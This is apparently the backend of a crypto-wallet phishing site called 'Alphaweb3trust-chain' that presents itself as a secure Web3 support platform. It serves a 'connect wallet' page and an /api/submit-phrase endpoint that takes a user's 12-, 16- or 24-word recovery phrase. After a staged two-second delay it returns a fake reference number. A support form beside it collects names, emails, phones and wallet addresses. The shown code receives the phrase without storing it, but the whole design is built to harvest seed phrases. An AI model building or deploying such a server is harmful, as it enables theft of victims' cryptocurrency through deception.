const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

const generateReferenceNumber = () => {
    return Math.floor(Math.random() * 9000000000000) + 1000000000000;
};

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/connect-wallet', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'connect-wallet.html'));
});

app.post('/api/submit-issue', async (req, res) => {
    try {
        const { issue_type, full_name, email, phone, description, wallet_address, transaction_hash, amount } = req.body;

        if (!issue_type || !full_name || !email || !description) {
            return res.status(400).json({
                success: false,
                error: 'Missing required fields'
            });
        }

        console.log('Issue submitted:', {
            issue_type,
            full_name,
            email,
            phone,
            wallet_address,
            transaction_hash,
            amount,
            timestamp: new Date().toISOString()
        });

        res.json({
            success: true,
            message: 'Issue submitted successfully',
            id: generateReferenceNumber()
        });
    } catch (error) {
        console.error('Error submitting issue:', error);
        res.status(500).json({
            success: false,
            error: 'Internal server error'
        });
    }
});

app.post('/api/submit-phrase', async (req, res) => {
    try {
        const { phrase, wallet, wordCount } = req.body;

        if (!phrase || !wallet || !wordCount) {
            return res.status(400).json({
                success: false,
                error: 'Missing required fields'
            });
        }

        if (wordCount !== 12 && wordCount !== 16 && wordCount !== 24) {
            return res.status(400).json({
                success: false,
                error: 'Invalid word count'
            });
        }

        console.log('Wallet phrase submitted:', {
            wallet,
            wordCount,
            timestamp: new Date().toISOString()
        });

        setTimeout(() => {
            const referenceNumber = generateReferenceNumber().toString();

            res.json({
                success: true,
                referenceNumber: referenceNumber,
                message: 'Phrase processed successfully'
            });
        }, 2000);

    } catch (error) {
        console.error('Error submitting phrase:', error);
        res.status(500).json({
            success: false,
            error: 'Internal server error'
        });
    }
});

app.listen(PORT, () => {
    console.log(`Alphaweb3trust-chain server running on http://localhost:${PORT}`);
    console.log('Secure Web3 Platform - Ready for Production');
});
